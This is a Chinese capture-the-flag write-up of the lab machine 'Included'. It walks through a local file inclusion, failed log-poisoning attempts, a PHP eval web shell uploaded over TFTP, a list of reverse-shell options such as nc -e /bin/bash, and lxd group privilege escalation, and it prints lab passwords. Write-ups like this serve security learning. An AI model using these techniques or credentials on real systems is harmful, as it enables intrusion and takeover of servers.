# Included



-   靶机：`10.10.10.55`
-   攻击机： `10.10.14.7`



## 信息收集



```shell
└─# nmap 10.10.10.55 -A                                                                                                                                                    1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 03:06 EST
2021-03-05 03:07:06 AEAD Decrypt error: bad packet ID (may be a replay): [ #355 ] -- see the man page entry for --no-replay and --replay-window for more info or silence this warning with --mute-replay-warnings
Nmap scan report for 10.10.10.55
Host is up (0.72s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.10.10.55/?file=index.php
```

扫描出来目标开放了80端口

看了一下扫描结果，结合本环境的题目，猜测是文件包含漏洞。



## web

访问之后直接跳转到`http://10.10.10.55/?file=index.php`

![image-20210305161200677](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305161200677.png)

### 文件包含

尝试修改`file`参，`file=../../../../../../../etc/passwd`，返回结果验证了漏洞的存在

![image-20210305161258721](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305161258721.png)



### 日志文件包含（失败）

文件包含想要getshell有以下几种方法：

-   结合文件上传。上传一个包含一句话木马的图片，包含这个图片，其中的代码就会被解释。

    -   由于没有上传点（或者我没找到？），无法通过此方法利用。

-   php伪协议。`php://input`伪协议可以将`post`的数据当作php代码执行，利用条件比较苛刻，需要开启一些参数。`allow_url_fopen`为设置为ON

    -   本题失败，应该是没有开启

        ![image-20210305162147225](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305162147225.png)

-   包含`/proc/self/environ`。Linux下每个进程的信息都在`/proc/self`目录下，`environ`记录了环境信息，在ua注入php代码，可能可以成功

    -   本题失败，直接包含`/proc/self/environ`，啥也没有。

        ![image-20210305162113730](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305162113730.png)

-   包含日志文件。各种中间件都会有自己的日志文件，包含了访问成功和不成功的信息。

本题失败，貌似是没有创建日志信息。

过程如下：

首先确定目标站点为`apache2`，访问了一个不存在的页面`aaa.php`，产生404报错信息。

![image-20210305162455419](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305162455419.png)

apache2的配置文件默认在`/etc/apache2/apache2.conf`，里面存放了`error.log`和`access.log`的位置。

`access.log`的那一行为`custom`开头，本题中没有。

![image-20210305162413064](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305162413064.png)

`error.log`的那一行直接搜索即可，没有注释掉，看上去可行的样子（看标题就知道不行了）

![image-20210305162653246](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305162653246.png)

`${APACHE_LOG_DIR}`是一个变量，在`/etc/apache2/envvars`中定义。默认为`export APACHE_LOG_DIR=/var/log/apache2$SUFFIX`

![image-20210305162905502](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305162905502.png)

所以`error.log`的位置为`/var/log/apache2/error.log`，好家伙，包含一下，没有

![image-20210305163021106](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305163021106.png)

此路不通



### tftp

wp上说：目标开放了一个`tftp`端口（我：？？？？不讲武德）

```shell
└─# nmap -sU 10.10.10.55 -A  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 03:08 EST
Stats: 0:09:13 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 56.74% done; ETC: 03:25 (0:07:01 remaining)
Stats: 0:09:13 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 56.74% done; ETC: 03:25 (0:07:01 remaining)
Nmap scan report for 10.10.10.55
Host is up (0.62s latency).
Not shown: 998 closed ports
PORT      STATE         SERVICE VERSION
69/udp    open|filtered tftp
24511/udp open|filtered unknown
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
```

其实在前面已经有线索了，在包含`/etc/passwd`的时候，最下面有一行`tftp`用户

![image-20210305163233015](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305163233015.png)

[tftp百度百科](https://baike.baidu.com/item/tftp/455170?fr=aladdin)

简单说一下就是一个类似于ftp的传文件的服务

传入一句话木马，然后包含即可，上传的路径就是`/etc/passwd`中`tftp`用户那一栏的用户根目录。

```php
// 2.php
┌──(root💀kali)-[/home/kali]
└─# cat 2.php         
<?php
        eval($_REQUEST['cmd']);
?>
                                                                                                                                                                               
┌──(root💀kali)-[/home/kali]
└─# tftp 10.10.10.55
tftp> put 2.php
Sent 37 bytes in 0.9 seconds
```

![image-20210305163631648](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305163631648.png)

不知道由于啥问题，用post发送的时候并不会执行命令，所以蚁剑连不上。

弹一个shell回来，方法有很多

-   使用kali下的`php-reverse-shell.php`
-   传一个nc，用`nc -e /bin/bash`
-   用`bash -i`

这里简单点，采用第一点。

![image-20210305164014853](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305164014853.png)



## 提权



### mike

user的flag在`/home/mike/user.txt`，但是需要mike的权限才能获取。

找了`setuid`，没用

```shell
www-data@included:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/at
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/gpasswd
/bin/umount
/bin/mount
/bin/fusermount
/bin/ping
/bin/su
/snap/core/7270/bin/mount
/snap/core/7270/bin/ping
/snap/core/7270/bin/ping6
/snap/core/7270/bin/su
/snap/core/7270/bin/umount
/snap/core/7270/usr/bin/chfn
/snap/core/7270/usr/bin/chsh
/snap/core/7270/usr/bin/gpasswd
/snap/core/7270/usr/bin/newgrp
/snap/core/7270/usr/bin/passwd
/snap/core/7270/usr/bin/sudo
/snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7270/usr/lib/openssh/ssh-keysign
/snap/core/7270/usr/lib/snapd/snap-confine
/snap/core/7270/usr/sbin/pppd
/snap/core/8689/bin/mount
/snap/core/8689/bin/ping
/snap/core/8689/bin/ping6
/snap/core/8689/bin/su
/snap/core/8689/bin/umount
/snap/core/8689/usr/bin/chfn
/snap/core/8689/usr/bin/chsh
/snap/core/8689/usr/bin/gpasswd
/snap/core/8689/usr/bin/newgrp
/snap/core/8689/usr/bin/passwd
/snap/core/8689/usr/bin/sudo
/snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8689/usr/lib/openssh/ssh-keysign
/snap/core/8689/usr/lib/snapd/snap-confine
/snap/core/8689/usr/sbin/pppd
```

么得啥用。



`sudo -l`也没有，甚至管我要密码，我哪来的密码啊。

结果告诉我mike的密码就是上个域渗透解密TGT出来的`Sheffield19`

![image-20210305165515238](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305165515238.png)



### root

`mike`在`lxd`组内，虽然不知道lxd是啥，直接百度搜一下lxd提权

参照：https://www.cnblogs.com/dem0/p/14208747.html 可知，lxd类似于docker，也是一种容器虚拟化技术。提权也和docker类似，docker是将主机目录挂载在docker镜像的`/mnt`目录下，lxd也差不多

`lxc image list`看一下容器

![image-20210305170151155](https://gitee.com/ethustdout/pics/raw/master/uPic/image-20210305170151155.png)

挂载镜像，在`/mnt/root/root`目录下就是主机的`/root`目录，下面有个`login.sql`，这必是下道题要用的信息，下载下来。有一个用户信息

```sql
INSERT INTO `login` VALUES (1,'Daniel','>SNDv*2wzLWf');
```



